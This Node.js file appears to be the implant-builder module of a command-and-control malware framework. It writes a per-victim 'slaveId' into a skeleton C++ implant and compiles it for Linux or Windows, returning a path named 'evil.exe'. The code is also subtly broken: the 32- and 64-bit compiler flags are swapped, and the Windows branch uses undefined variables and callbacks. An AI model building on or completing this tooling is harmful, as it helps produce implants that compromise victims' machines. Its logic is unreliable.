
const {exec, execFileSync, execSync} = require("child_process");
const fs = require("fs");

global.ENDIAN32 = 32
global.ENDIAN64 = 64

// Compilers
const COMPILER_PE = "x86_64-w64-mingw32-g++ -I /usr/share/mingw-w64/include/";
const COMPILER_ELF = "g++";
const CODE_MARKER = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"

// Locations
const IMPLANTS_OUTPUT = "./implants/";
const SKEL_ELF_LOC = "./skeleton_implant/elf/main.cpp"
const SKEL_PE_LOC = "./skeleton_implant/pe/main.cpp"
const TEMP_SOURCE = "./skeleton_implant/temp.cpp" // Path to source with id marker. 

const generateImplant = (slaveId, os, success, failed) => {    
    
    // Generate binary for the client.
    switch (os) {
        case "ELF32":
            return generateLinuxImplant(slaveId, global.ENDIAN32, success, failed);
            
        case "ELF64":
            return  generateLinuxImplant(slaveId, global.ENDIAN64, success, failed);

        case "PE32":
            return generateWindowsImplant(slaveId, global.ENDIAN32, success, failed)

        case "PE64":
            return generateWindowsImplant(slaveId, global.ENDIAN64, success, failed);
        
        default:
            return failed("Unknown OS");
    }
}

const generateLinuxImplant = (id, endianess, success, failed) => {
    
    // Create temp file for putting in the id. 
    var code = fs.readFileSync(SKEL_ELF_LOC).toString();
    fs.writeFileSync(TEMP_SOURCE, code.replace(CODE_MARKER, id));

    
    let outputPath = IMPLANTS_OUTPUT + id + " "; // Space for command alignment
    // Compile binary.
    if (endianess == ENDIAN32) {

        console.log("Compiling implant for linux 32 bit.")
        exec(COMPILER_ELF + " -o " + outputPath + TEMP_SOURCE, )
    }
    else {

        console.log("Compiling implant for linux 64 bit.")

        exec(COMPILER_ELF + " -m32 " + " -o " + outputPath + TEMP_SOURCE, (err, stdout, stderr) => {

            if (err) {
                console.error("Failed to compile binary!");
                failed(stderr, true);
                return;
            }

            success(id);
        });
    }
}

const generateWindowsImplant = (id, endianess) => {

    if (endianess == ENDIAN32) {

        console.log("Compiling implant for windows 32 bit.")

        
        
    } else {
        
        exec(COMPILER_PE + " -o " + outputPath + TEMP_SOURCE, (err, stdout, stderr) => {
            if (err) {
                console.error("Failed to compile binary!");
                failed(stderr, true)
                return;
            }
        })

        console.log("Compiling implant for windows 64 bit.")
    }

    return "./evil.exe"
}

module.exports = {
    generateImplant,
}